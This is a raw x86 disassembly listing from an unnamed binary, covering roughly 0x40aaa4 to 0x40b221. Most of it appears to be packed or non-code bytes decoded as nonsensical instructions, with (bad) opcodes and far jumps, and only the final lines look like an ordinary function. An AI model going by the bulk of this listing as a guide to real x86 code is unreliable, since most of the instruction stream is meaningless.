  40aaa4:	or     BYTE PTR [eax+0x42f8c67f],0xa8
  40aaab:	pop    edi
  40aaac:	adc    edi,DWORD PTR [edi]
  40aaae:	jmp    0xca3a:0xea19803e
  40aab5:	lahf   
  40aab6:	stos   BYTE PTR es:[edi],al
  40aab7:	out    0x64,eax
  40aab9:	mov    edx,0x67217c94
  40aabe:	and    DWORD PTR [ebx+0x28ea930a],ebp
  40aac4:	jg     0x40aacf
  40aac6:	div    BYTE PTR [ebx+0xddff4ed]
  40aacc:	xchg   ecx,eax
  40aacd:	ins    DWORD PTR es:[edi],dx
  40aace:	jp     0x40ab3d
  40aad0:	mov    ebx,0x138fccd
  40aad5:	or     DWORD PTR [ebx-0x5b],edx
  40aad8:	fisub  DWORD PTR [eax-0x7f]
  40aadb:	aam    0x27
  40aadd:	sbb    DWORD PTR [ebp+edi*2+0x1bbbb00d],eax
  40aae4:	push   es
  40aae5:	jmp    0x40ab2f
  40aae7:	jmp    0x40aa77
  40aae9:	pop    esi
  40aaea:	inc    edi
  40aaeb:	ja     0x40ab33
  40aaed:	sahf   
  40aaee:	mov    dl,0x2b
  40aaf0:	jae    0x40ab48
  40aaf2:	sub    eax,0x75347198
  40aaf7:	std    
  40aaf8:	xor    eax,0xcbb4d02c
  40aafd:	adc    DWORD PTR [edi+0x3d],0x1f
  40ab01:	fistp  QWORD PTR [esp+ebp*4-0x1021efe7]
  40ab08:	out    0x36,eax
  40ab0a:	cmp    BYTE PTR [ecx+0x269eb464],0xcc
  40ab11:	jbe    0x40ab49
  40ab13:	and    BYTE PTR [ebp+0x21],bh
  40ab16:	add    eax,0xd6966ada
  40ab1b:	sar    DWORD PTR [ecx-0x6d09ddc3],cl
  40ab21:	dec    ecx
  40ab22:	push   eax
  40ab23:	test   al,0x94
  40ab25:	dec    ecx
  40ab26:	(bad)  
  40ab27:	imul   ebx,DWORD PTR [eax],0xffffffcc
  40ab2a:	sets   bh
  40ab2d:	add    eax,0x78621120
  40ab32:	(bad)  
  40ab33:	pop    ds
  40ab34:	fld    QWORD PTR [edi-0xd]
  40ab37:	int3   
  40ab38:	dec    esi
  40ab39:	sub    al,ah
  40ab3b:	cli    
  40ab3c:	inc    eax
  40ab3d:	pop    eax
  40ab3e:	test   BYTE PTR [eax-0x60dca6cd],al
  40ab44:	in     al,0x5c
  40ab46:	sub    esp,DWORD PTR [edi]
  40ab48:	sub    DWORD PTR [esi],0xffffff89
  40ab4b:	jmp    0xb2a97c37
  40ab50:	mov    edx,0x567a9f89
  40ab55:	stos   DWORD PTR es:[edi],eax
  40ab56:	hlt    
  40ab57:	aaa    
  40ab58:	out    dx,al
  40ab59:	jnp    0x40abc2
  40ab5b:	(bad)  
  40ab5d:	jge    0x40ab4f
  40ab5f:	or     ebx,DWORD PTR ds:0x7a5e7b04
  40ab65:	in     al,dx
  40ab66:	sub    al,0x8d
  40ab68:	(bad)  
  40ab69:	dec    esi
  40ab6a:	mov    edi,0x6016c222
  40ab6f:	xor    ah,BYTE PTR [eax+0xd]
  40ab72:	fcom   QWORD PTR [ebx-0x66649ad7]
  40ab78:	push   es
  40ab79:	push   edi
  40ab7a:	or     DWORD PTR [ebp-0x6a0ca8cb],edi
  40ab80:	lahf   
  40ab81:	xchg   ecx,eax
  40ab82:	xchg   edx,eax
  40ab83:	push   es
  40ab84:	mov    cl,0xb6
  40ab86:	shl    DWORD PTR [eax],0x3a
  40ab89:	xor    DWORD PTR [bx],esi
  40ab8c:	mov    ebp,0x2f58d0e6
  40ab91:	sbb    DWORD PTR [eax-0x756c1304],edi
  40ab97:	jle    0x40ab57
  40ab99:	dec    esp
  40ab9a:	ds leave 
  40ab9c:	mov    ah,BYTE PTR [ebx+0x37cca055]
  40aba2:	inc    esi
  40aba3:	dec    edi
  40aba4:	cmp    DWORD PTR [ebx+0x53],esi
  40aba7:	cmp    al,0xea
  40abaa:	sahf   
  40abab:	mov    WORD PTR ds:0x95a8ff93,fs
  40abb1:	ja     0x40abe8
  40abb3:	cld    
  40abb4:	mov    ah,BYTE PTR [eax-0x26]
  40abb7:	leave  
  40abb8:	sbb    bl,ah
  40abba:	cli    
  40abbb:	retf   
  40abbc:	and    DWORD PTR [ebx],0xffffffca
  40abbf:	inc    eax
  40abc0:	jno    0x40abe3
  40abc2:	sahf   
  40abc3:	push   cs
  40abc4:	shl    BYTE PTR [edx],0xb9
  40abc7:	inc    edi
  40abc8:	or     eax,0xd639f0a3
  40abcd:	mov    ds:0xae9a2db3,al
  40abd2:	loopne 0x40ac03
  40abd4:	push   ss
  40abd5:	push   eax
  40abd6:	pop    edx
  40abd7:	cs dec edi
  40abd9:	xor    ebx,DWORD PTR [ebx+ebp*8]
  40abdc:	jns    0x40ac32
  40abde:	jg     0x40ac19
  40abe0:	popa   
  40abe1:	out    dx,al
  40abe2:	or     DWORD PTR [ecx-0x79],ecx
  40abe5:	jbe    0x40abe7
  40abe7:	jge    0x40ab7c
  40abe9:	aad    0xb
  40abeb:	pop    ebx
  40abec:	test   cl,dh
  40abee:	lods   al,BYTE PTR ds:[esi]
  40abef:	sbb    edi,esi
  40abf1:	dec    edi
  40abf2:	lods   eax,DWORD PTR gs:[esi]
  40abf4:	or     ah,BYTE PTR [eax-0xa1e7269]
  40abfa:	enter  0xf4fe,0xf0
  40abfe:	mov    ds:0x7830a3bb,eax
  40ac03:	push   ss
  40ac04:	jecxz  0x40ac6b
  40ac06:	cmp    al,BYTE PTR [edx]
  40ac08:	mov    eax,ds:0xf2238b18
  40ac0d:	fidivr DWORD PTR [ebp-0x1c]
  40ac10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac11:	pop    edi
  40ac12:	inc    esp
  40ac13:	test   DWORD PTR [ebx+0x1b01d872],0x7f03c3fb
  40ac1d:	js     0x40abe9
  40ac1f:	(bad)  
  40ac20:	pushf  
  40ac21:	les    edx,FWORD PTR [eax+0xb95c55b]
  40ac27:	adc    eax,0x8a1be706
  40ac2c:	sbb    eax,0x9f63bc25
  40ac31:	cmp    dh,BYTE PTR [ecx+esi*8+0x1eb0fc8a]
  40ac38:	dec    esp
  40ac39:	push   esp
  40ac3a:	sub    esi,DWORD PTR [edx+ebp*4-0x53]
  40ac3e:	sbb    ch,ch
  40ac40:	pop    ds
  40ac41:	ret    0x4f90
  40ac44:	jg     0x40ac4f
  40ac46:	jg     0x40ac0f
  40ac48:	push   ecx
  40ac49:	xor    ah,BYTE PTR ds:0x90a860d7
  40ac4f:	repnz es cmp ah,bh
  40ac53:	or     dl,BYTE PTR [edi]
  40ac55:	imul   ebp,DWORD PTR [esi+0xd],0x15
  40ac59:	ins    DWORD PTR es:[edi],dx
  40ac5a:	in     eax,dx
  40ac5b:	sbb    BYTE PTR [eax],cl
  40ac5d:	jbe    0x40abed
  40ac5f:	cdq    
  40ac60:	adc    al,0x2c
  40ac62:	dec    edx
  40ac63:	or     dl,BYTE PTR [eax+0x72]
  40ac66:	test   BYTE PTR [esi-0x5bac14e6],0xf6
  40ac6d:	clc    
  40ac6e:	pop    es
  40ac6f:	repz dec ecx
  40ac71:	push   ebx
  40ac72:	jmp    0xfdaf:0xbcf0c15
  40ac79:	mov    ah,BYTE PTR [eax]
  40ac7b:	lahf   
  40ac7c:	jmp    0x4de7:0xa4333d7d
  40ac83:	leave  
  40ac84:	dec    esi
  40ac85:	in     al,dx
  40ac86:	dec    ecx
  40ac87:	xor    al,0xa4
  40ac89:	test   BYTE PTR [ecx-0x2797109d],0x19
  40ac90:	movq   mm0,QWORD PTR [ecx]
  40ac93:	stos   BYTE PTR es:[edi],al
  40ac94:	sti    
  40ac95:	int    0x0
  40ac97:	fidivr DWORD PTR [ecx+0x64]
  40ac9a:	mov    dl,0xe8
  40ac9c:	push   0x179a228
  40aca1:	gs inc ebp
  40aca3:	retf   
  40aca4:	daa    
  40aca5:	rol    al,cl
  40aca7:	and    ah,al
  40aca9:	int    0x63
  40acab:	sbb    BYTE PTR [edi-0x24],bh
  40acae:	cdq    
  40acaf:	xchg   ecx,eax
  40acb0:	scas   eax,DWORD PTR es:[edi]
  40acb1:	call   0x1da12b56
  40acb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acb7:	ins    DWORD PTR es:[edi],dx
  40acb8:	add    DWORD PTR [esi],edx
  40acba:	push   ebx
  40acbb:	enter  0x540d,0xdf
  40acbf:	sbb    DWORD PTR [edi],edi
  40acc1:	push   eax
  40acc2:	jbe    0x40acf3
  40acc4:	adc    BYTE PTR [edi+0x1a],0xe
  40acc8:	sbb    eax,0x2d81bfc9
  40accd:	hlt    
  40acce:	mov    bl,0x9e
  40acd0:	pop    es
  40acd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acd2:	inc    edi
  40acd3:	xchg   edx,eax
  40acd4:	sbb    DWORD PTR [edx],esi
  40acd6:	cld    
  40acd7:	adc    eax,0x84a9136d
  40acdc:	test   al,0xd2
  40acde:	aad    0x8a
  40ace0:	push   esp
  40ace1:	push   edx
  40ace2:	dec    ebx
  40ace3:	sbb    edi,DWORD PTR [edx-0x39]
  40ace6:	add    DWORD PTR [edi-0x342e3a28],eax
  40acec:	stc    
  40aced:	inc    eax
  40acee:	dec    edi
  40acef:	popa   
  40acf0:	xchg   ebp,eax
  40acf1:	iret   
  40acf2:	cdq    
  40acf3:	sbb    al,0x7f
  40acf5:	adc    al,0xb8
  40acf7:	xchg   edx,eax
  40acf8:	ins    DWORD PTR es:[edi],dx
  40acf9:	int3   
  40acfa:	and    eax,0xcc35e1bc
  40acff:	dec    ebx
  40ad00:	ds test al,cl
  40ad03:	ja     0x40acfd
  40ad05:	sti    
  40ad06:	pushf  
  40ad07:	ja     0x40ad46
  40ad09:	mul    BYTE PTR [esi+eiz*1]
  40ad0c:	cmc    
  40ad0d:	or     eax,0xbc237647
  40ad12:	pop    ebx
  40ad13:	inc    esi
  40ad14:	jp     0x40ad49
  40ad16:	sbb    ebx,esp
  40ad18:	jle    0x40accc
  40ad1a:	shl    DWORD PTR [ecx-0x67],0x56
  40ad1e:	jnp    0x40ad40
  40ad20:	out    dx,al
  40ad21:	(bad)  
  40ad23:	cmp    eax,0xbe13a71e
  40ad28:	jecxz  0x40ad88
  40ad2a:	mov    WORD PTR [ebx],ss
  40ad2c:	xchg   BYTE PTR [eax],dl
  40ad2e:	push   ds
  40ad2f:	adc    eax,0xc1f3cd74
  40ad34:	xchg   edi,eax
  40ad35:	mulps  xmm1,XMMWORD PTR [ecx-0x72]
  40ad39:	push   ecx
  40ad3a:	mov    bh,0x5
  40ad3c:	ja     0x40acd2
  40ad3e:	xchg   esp,eax
  40ad3f:	xor    BYTE PTR [edx+0x78],al
  40ad42:	out    dx,eax
  40ad43:	or     al,0xb
  40ad45:	mov    ecx,0x94e10469
  40ad4a:	test   al,0xb2
  40ad4c:	pop    es
  40ad4d:	pop    esi
  40ad4e:	fcomip st,st(7)
  40ad50:	imul   eax,DWORD PTR [ecx],0xdcb7afd8
  40ad56:	ds (bad) 
  40ad58:	pop    eax
  40ad59:	push   eax
  40ad5a:	call   0xf59f:0x33bf13fd
  40ad61:	repnz push eax
  40ad63:	jns    0x40ad29
  40ad65:	pushf  
  40ad66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad68:	sub    al,0x6e
  40ad6a:	xchg   esp,eax
  40ad6b:	mov    edi,0xf1020683
  40ad70:	mov    al,ds:0x2a0f1593
  40ad75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad76:	fs into 
  40ad78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad79:	push   ebx
  40ad7a:	sub    eax,esp
  40ad7c:	call   0x7f79:0xe5f2e30b
  40ad83:	in     eax,dx
  40ad84:	cmp    ebx,DWORD PTR [edx]
  40ad86:	xor    DWORD PTR [ecx],eax
  40ad88:	xchg   ebp,eax
  40ad89:	aaa    
  40ad8a:	ror    DWORD PTR ss:[edx+esi*4],1
  40ad8e:	nop
  40ad8f:	sub    BYTE PTR [eax],0xa0
  40ad92:	adc    ah,BYTE PTR [edx+0xc43cdd6]
  40ad98:	mov    bl,0x87
  40ad9a:	xchg   edi,eax
  40ad9b:	js     0x40adae
  40ad9d:	mov    al,ds:0xf77a27bc
  40ada2:	xchg   DWORD PTR [esi+0x33],esi
  40ada5:	mov    eax,0x8e1f6027
  40adaa:	jnp    0x40ad68
  40adac:	clc    
  40adad:	sub    al,0xbd
  40adaf:	xor    dh,cl
  40adb1:	enter  0x6aa9,0x33
  40adb5:	jmp    0x40adae
  40adb7:	lods   eax,DWORD PTR ds:[esi]
  40adb8:	mov    bh,0xaa
  40adba:	mov    edi,0xac6d2215
  40adbf:	mov    esi,0x92ec672d
  40adc4:	ret    0xfe83
  40adc7:	xor    cl,BYTE PTR [ecx]
  40adc9:	sub    eax,0x8817fba9
  40adce:	imul   edi,DWORD PTR [eax+ebp*4+0x77],0x185f74fd
  40add6:	retf   0x8e81
  40add9:	shl    BYTE PTR [ebx-0x5f],0xfc
  40addd:	xchg   ebx,eax
  40adde:	push   cs
  40addf:	imul   esi,DWORD PTR [edi],0xffffffff
  40ade2:	ins    BYTE PTR es:[edi],dx
  40ade3:	fstp   TBYTE PTR [edx+ecx*2+0x7072cb31]
  40adea:	mov    ebp,0x79ae172b
  40adef:	hlt    
  40adf0:	or     BYTE PTR [eax],al
  40adf2:	popf   
  40adf3:	jb     0x40ad93
  40adf5:	js     0x40ae0c
  40adf7:	scas   eax,DWORD PTR es:[edi]
  40adf8:	add    al,0xd
  40adfa:	jecxz  0x40ada3
  40adfc:	mov    DWORD PTR [edx+0x7d],0xe5853372
  40ae03:	xor    ebx,edx
  40ae05:	test   ebx,ecx
  40ae07:	mov    edi,0x8ce21b4d
  40ae0c:	int3   
  40ae0d:	jecxz  0x40adc8
  40ae0f:	xlat   BYTE PTR ds:[ebx]
  40ae10:	jbe    0x40ae1b
  40ae12:	cmp    dl,BYTE PTR [eax+0x1196ac2d]
  40ae18:	inc    eax
  40ae19:	pop    esp
  40ae1a:	inc    esi
  40ae1b:	or     esi,DWORD PTR [edi]
  40ae1d:	and    eax,0xdb774162
  40ae22:	loopne 0x40ae5f
  40ae24:	mov    bl,0x7a
  40ae26:	out    dx,eax
  40ae27:	cli    
  40ae28:	adc    ah,ch
  40ae2a:	push   0x6c
  40ae2c:	inc    ebp
  40ae2d:	mov    eax,0xe2431b7a
  40ae32:	imul   edx,DWORD PTR [ecx],0x4d42f51d
  40ae38:	enter  0xae6c,0xde
  40ae3c:	jecxz  0x40ae84
  40ae3e:	dec    eax
  40ae3f:	add    ch,dl
  40ae41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae42:	and    eax,0xc52d4c05
  40ae47:	pop    esi
  40ae48:	ja     0x40ae3e
  40ae4a:	iret   
  40ae4b:	push   0xffffffe8
  40ae4d:	lds    ebx,FWORD PTR ds:0x40546c60
  40ae53:	push   ss
  40ae54:	sti    
  40ae55:	aaa    
  40ae56:	pop    edi
  40ae57:	mov    al,ds:0xb4110be4
  40ae5c:	dec    eax
  40ae5d:	sbb    DWORD PTR [eax+eax*4],ebp
  40ae60:	nop
  40ae61:	stc    
  40ae62:	and    al,0xc7
  40ae64:	push   ds
  40ae65:	(bad)  [edi-0x609c3fc0]
  40ae6b:	xchg   ebp,eax
  40ae6c:	inc    eax
  40ae6d:	dec    edx
  40ae6e:	cmc    
  40ae6f:	sbb    BYTE PTR [edi],0x7
  40ae72:	xlat   BYTE PTR ds:[ebx]
  40ae73:	mov    esp,0x1fb49071
  40ae78:	aas    
  40ae79:	(bad)  
  40ae7a:	and    ch,dh
  40ae7c:	inc    esp
  40ae7d:	push   eax
  40ae7e:	or     eax,DWORD PTR [ebx-0x50]
  40ae81:	mov    esp,0x951e5342
  40ae86:	ins    BYTE PTR es:[edi],dx
  40ae87:	arpl   bx,sp
  40ae89:	push   edx
  40ae8a:	adc    DWORD PTR [ecx+0x53],0x50f294a2
  40ae91:	sub    BYTE PTR [esi+0x28],0x17
  40ae95:	or     al,0x0
  40ae97:	ins    DWORD PTR es:[edi],dx
  40ae98:	out    0x71,eax
  40ae9a:	push   edi
  40ae9b:	mov    dh,BYTE PTR [esi]
  40ae9d:	in     eax,dx
  40ae9e:	cmp    ah,BYTE PTR [ebx]
  40aea0:	pop    ebx
  40aea1:	shl    BYTE PTR [ebx-0xa6e86db],cl
  40aea7:	add    edi,ebp
  40aea9:	push   edx
  40aeaa:	cmp    DWORD PTR [ebp+0x7a],0x5e
  40aeae:	(bad)  
  40aeaf:	mov    ch,0xae
  40aeb1:	mov    bh,0x86
  40aeb3:	pop    ebp
  40aeb4:	add    bl,BYTE PTR [ebx]
  40aeb6:	outs   dx,DWORD PTR ds:[esi]
  40aeb7:	out    0xb2,al
  40aeb9:	mov    DWORD PTR [edx],ebp
  40aebb:	call   0xef48a14f
  40aec0:	shr    DWORD PTR [edi],1
  40aec2:	nop
  40aec3:	fisubr DWORD PTR [eax+0xd]
  40aec6:	test   DWORD PTR ds:0xa22e7088,esi
  40aecc:	pop    ebx
  40aecd:	hlt    
  40aece:	mov    ebx,DWORD PTR [edi]
  40aed0:	inc    ebx
  40aed1:	int3   
  40aed2:	fwait
  40aed3:	jae    0x40ae7d
  40aed5:	je     0x40ae86
  40aed7:	push   0xffffffde
  40aed9:	mov    ds:0xce7eba8b,eax
  40aede:	int3   
  40aedf:	pop    eax
  40aee0:	sub    eax,0xce546a69
  40aee5:	mov    edx,0xaac74c15
  40aeea:	dec    ebx
  40aeeb:	sahf   
  40aeec:	pop    ecx
  40aeed:	dec    edi
  40aeee:	cmp    eax,0xd41d7b3c
  40aef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aef4:	push   es
  40aef5:	jge    0x40ae91
  40aef7:	idiv   BYTE PTR [edx]
  40aef9:	xchg   bh,bl
  40aefb:	dec    ebp
  40aefc:	into   
  40aefd:	and    esp,ecx
  40aeff:	std    
  40af00:	pusha  
  40af01:	ss xchg edi,eax
  40af03:	jb     0x40af18
  40af05:	iret   
  40af06:	loop   0x40aea0
  40af08:	cmp    al,0x45
  40af0a:	push   ss
  40af0b:	cld    
  40af0c:	int3   
  40af0d:	sbb    al,0x62
  40af0f:	in     eax,dx
  40af10:	xor    BYTE PTR [esi-0x54],bh
  40af13:	gs xchg esi,eax
  40af15:	aaa    
  40af16:	xchg   ecx,eax
  40af17:	mov    ds:0x12849635,al
  40af1c:	pop    ebx
  40af1d:	push   ebx
  40af1e:	sahf   
  40af1f:	(bad)  
  40af20:	pop    ecx
  40af21:	jg     0x40aefe
  40af23:	pop    ss
  40af24:	arpl   WORD PTR [esi-0x25],bp
  40af27:	jo     0x40aedf
  40af29:	jl     0x40aef4
  40af2b:	ret    0xfe4c
  40af2e:	mov    al,0x85
  40af30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af31:	(bad)  
  40af32:	fstp   QWORD PTR [ecx]
  40af34:	cwde   
  40af35:	pop    ecx
  40af36:	loope  0x40af00
  40af38:	mov    edx,DWORD PTR [ecx+edx*1+0x6246824b]
  40af3f:	hlt    
  40af40:	pop    eax
  40af41:	and    eax,0x2929000
  40af46:	add    eax,0x265b0d27
  40af4b:	test   eax,0x7bb04550
  40af50:	push   es
  40af51:	push   es
  40af52:	out    0xf2,al
  40af54:	icebp  
  40af55:	dec    esi
  40af56:	sub    al,0x8b
  40af58:	and    bh,ah
  40af5a:	and    eax,0x1dcb8d38
  40af5f:	pop    edi
  40af60:	dec    ebp
  40af61:	mov    dh,0xc2
  40af63:	sbb    al,0x93
  40af65:	xor    BYTE PTR [ecx-0x4f],0x40
  40af69:	sahf   
  40af6a:	or     DWORD PTR ds:0xf1d2d09f,eax
  40af70:	push   eax
  40af71:	imul   eax,DWORD PTR [ebp-0x46155c92],0x3e
  40af78:	dec    ebp
  40af79:	retf   
  40af7a:	pop    eax
  40af7b:	mov    dh,BYTE PTR [ebx+eax*4-0x45]
  40af7f:	push   es
  40af80:	jmp    0x197c:0xdfdd1aee
  40af87:	inc    ebx
  40af88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af89:	sub    DWORD PTR [ebp-0x7f],esi
  40af8c:	add    BYTE PTR [eax-0x43],dh
  40af8f:	js     0x40af3e
  40af91:	aas    
  40af92:	mov    ebp,0x6919c10b
  40af97:	lahf   
  40af98:	cs mov ch,ah
  40af9b:	jecxz  0x40af7e
  40af9d:	pop    ds
  40af9e:	aad    0x8b
  40afa0:	ficomp WORD PTR fs:[ecx+0x1a]
  40afa4:	cs inc eax
  40afa6:	aas    
  40afa7:	lods   eax,DWORD PTR ds:[esi]
  40afa8:	out    0xe3,al
  40afaa:	stos   BYTE PTR es:[edi],al
  40afab:	and    al,0x9c
  40afad:	(bad)  
  40afae:	fadd   QWORD PTR [edi]
  40afb0:	xchg   ecx,eax
  40afb1:	outs   dx,BYTE PTR ds:[esi]
  40afb2:	mov    esp,0x7f6af22f
  40afb7:	adc    eax,0x924ed980
  40afbc:	sbb    DWORD PTR ds:0xd544c7b8,edx
  40afc2:	sub    DWORD PTR [ecx+edi*8+0x7bbd5953],0xffffffdf
  40afca:	mov    ds:0x35a9b806,al
  40afcf:	sbb    BYTE PTR [esi+esi*1-0x62],cl
  40afd3:	xlat   BYTE PTR ds:[ebx]
  40afd4:	ja     0x40b001
  40afd6:	add    DWORD PTR [esi-0x44074547],ebp
  40afdc:	sub    eax,0x8355cd23
  40afe1:	xor    eax,0x32d4b04
  40afe6:	inc    edi
  40afe7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40afe9:	clc    
  40afea:	jg     0x40b06a
  40afec:	loope  0x40b067
  40afee:	xor    DWORD PTR [eax],esi
  40aff0:	sti    
  40aff1:	mov    ah,0xd8
  40aff3:	xchg   ebx,eax
  40aff4:	adc    eax,0x7c00e26a
  40aff9:	shl    BYTE PTR [esi+ecx*2+0x1e],cl
  40affd:	and    ebp,DWORD PTR [esi-0x42]
  40b000:	retf   0x25b6
  40b003:	jne    0x40af9c
  40b005:	pop    ds
  40b006:	shl    BYTE PTR [eax-0x76],1
  40b009:	leave  
  40b00a:	inc    ebp
  40b00b:	jns    0x40b085
  40b00d:	jecxz  0x40b079
  40b00f:	jecxz  0x40b022
  40b011:	test   BYTE PTR [edi+0x36],bl
  40b014:	cs ds das 
  40b017:	inc    ecx
  40b018:	dec    edi
  40b019:	xor    DWORD PTR [edx-0x43],0x63
  40b01d:	call   0xe49cb17a
  40b022:	vorpd  ymm0,ymm2,ymm5
  40b026:	dec    edx
  40b027:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40b029:	loope  0x40b065
  40b02b:	or     DWORD PTR [esi+0x52],ebp
  40b02e:	cmc    
  40b02f:	pop    es
  40b030:	add    DWORD PTR ds:0x2678975d,edx
  40b036:	push   ecx
  40b037:	cmp    al,0xb1
  40b039:	aad    0x6f
  40b03b:	shr    BYTE PTR [ebx-0x21bcad27],0x33
  40b042:	ror    DWORD PTR [ecx],0xd5
  40b045:	mov    ds:0xa02cd276,al
  40b04a:	daa    
  40b04b:	test   BYTE PTR [eax],0x81
  40b04e:	mov    eax,0xb5748fcd
  40b053:	js     0x40b023
  40b055:	cmp    ebx,eax
  40b057:	push   esi
  40b058:	sub    eax,0x43dde2b2
  40b05d:	inc    edi
  40b05e:	sub    al,0xad
  40b060:	sbb    al,0x62
  40b062:	jae    0x40b0a0
  40b064:	ret    
  40b065:	xor    eax,0xf0ab2f71
  40b06a:	mov    ecx,0xf15d1fda
  40b06f:	outs   dx,BYTE PTR ds:[esi]
  40b070:	push   ebx
  40b071:	adc    ch,al
  40b073:	fwait
  40b074:	push   edx
  40b075:	iret   
  40b076:	fidiv  WORD PTR [edx+0x33458bfd]
  40b07c:	jle    0x40b052
  40b07e:	inc    esi
  40b07f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b080:	cld    
  40b081:	imul   ebx,DWORD PTR [edx+ebx*1],0x17f8a5b
  40b088:	adc    BYTE PTR ds:0x17bd1fc4,dh
  40b08e:	xor    edi,DWORD PTR [ecx+0x44751f94]
  40b094:	test   bh,cl
  40b096:	in     eax,0xd
  40b098:	xor    ebp,eax
  40b09a:	inc    edx
  40b09b:	loopne 0x40b097
  40b09d:	(bad)  
  40b09e:	cli    
  40b09f:	mov    DWORD PTR [esi-0x2cf5cbb9],esp
  40b0a5:	je     0x40b0ef
  40b0a7:	or     cl,BYTE PTR [ebp+0x22]
  40b0aa:	out    0x48,eax
  40b0ac:	jecxz  0x40b122
  40b0ae:	pop    ecx
  40b0af:	mov    cl,0x26
  40b0b1:	dec    ebx
  40b0b2:	xor    DWORD PTR [esi+esi*8+0x66304e91],0xe70e7d49
  40b0bd:	int3   
  40b0be:	sbb    DWORD PTR [edx-0x7047b73],edx
  40b0c4:	fstp   QWORD PTR [esi]
  40b0c6:	xor    BYTE PTR [ebx],bh
  40b0c8:	pop    ds
  40b0c9:	leave  
  40b0ca:	push   ds
  40b0cb:	cmp    BYTE PTR [ecx+0x541957fa],0x5e
  40b0d2:	std    
  40b0d3:	hlt    
  40b0d4:	xchg   edi,eax
  40b0d5:	jo     0x40b144
  40b0d7:	mov    al,0xbe
  40b0d9:	mov    esp,0x2a1ac88
  40b0de:	iret   
  40b0df:	mov    edi,0xf028330b
  40b0e4:	pop    edi
  40b0e5:	push   ebx
  40b0e6:	pop    es
  40b0e7:	int    0xca
  40b0e9:	cwde   
  40b0ea:	xchg   ebp,eax
  40b0eb:	sbb    ebx,DWORD PTR [edi+esi*2-0x59]
  40b0ef:	andps  xmm4,XMMWORD PTR [edi+0x7d927e93]
  40b0f6:	out    0x59,eax
  40b0f8:	add    eax,DWORD PTR [eax-0x6acbbf61]
  40b0fe:	ficomp DWORD PTR [ebx]
  40b100:	jmp    0x40b0a9
  40b102:	adc    esi,esp
  40b104:	mov    ebp,0x87d29199
  40b109:	xor    al,0xd3
  40b10b:	ja     0x40b0df
  40b10d:	jne    0x40b13a
  40b10f:	cs fwait
  40b111:	jecxz  0x40b15b
  40b113:	mov    ch,0x5
  40b115:	js     0x40b110
  40b117:	sub    eax,0x29435353
  40b11c:	iret   
  40b11d:	inc    eax
  40b11e:	mov    cs,WORD PTR [ecx]
  40b120:	clc    
  40b121:	fs jecxz 0x40b174
  40b124:	mov    al,ds:0x20fec3a5
  40b129:	imul   edi,DWORD PTR [ebp-0x1c],0x17
  40b12d:	sub    eax,0x7e27727a
  40b132:	jmp    0x3911406a
  40b137:	frstor [edi]
  40b139:	add    eax,0x8cf51c7f
  40b13e:	fidiv  WORD PTR [edi+0x4b]
  40b141:	pop    esp
  40b142:	xor    BYTE PTR [si],ah
  40b145:	stos   BYTE PTR es:[edi],al
  40b146:	ret    
  40b147:	jne    0x40b1b2
  40b149:	cmp    eax,0xee948029
  40b14e:	inc    ecx
  40b14f:	xchg   ecx,eax
  40b150:	aas    
  40b151:	lods   eax,DWORD PTR ds:[esi]
  40b152:	(bad)  
  40b153:	out    0x11,al
  40b155:	stos   BYTE PTR es:[edi],al
  40b156:	pop    ebx
  40b157:	dec    edi
  40b158:	mov    esi,0xd2251e3a
  40b15d:	stos   DWORD PTR es:[edi],eax
  40b15e:	inc    ebx
  40b15f:	ja     0x40b1b5
  40b161:	mov    ebx,0x70fc2a94
  40b166:	rol    bh,0x10
  40b169:	ret    
  40b16a:	scas   eax,DWORD PTR es:[edi]
  40b16b:	adc    eax,0x26211f7c
  40b170:	in     eax,0x1c
  40b172:	xchg   ecx,eax
  40b173:	mov    cl,0xb9
  40b175:	in     eax,dx
  40b176:	mov    ch,0xec
  40b178:	push   0x84c4c974
  40b17d:	push   ss
  40b17e:	or     ebp,ebx
  40b180:	xchg   edi,eax
  40b181:	jae    0x40b187
  40b183:	ss fwait
  40b185:	xchg   esp,eax
  40b186:	jnp    0x40b112
  40b188:	fadd   DWORD PTR ds:0xfae73247
  40b18e:	push   0x6b5c7400
  40b193:	repz xchg esp,eax
  40b195:	(bad)
  40b198:	inc    ebp
  40b199:	sbb    BYTE PTR [ebx+0x46891075],cl
  40b19f:	or     al,0x8b
  40b1a1:	inc    ebp
  40b1a2:	sbb    al,0x8b
  40b1a4:	jne    0x40b1b6
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41e0ec
  40b1bd:	sub    ecx,DWORD PTR ds:0x432010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x42f004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x431000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x432004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x430004,0x42f020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x431010,0x432004
  40b221:	add    edx,ecx
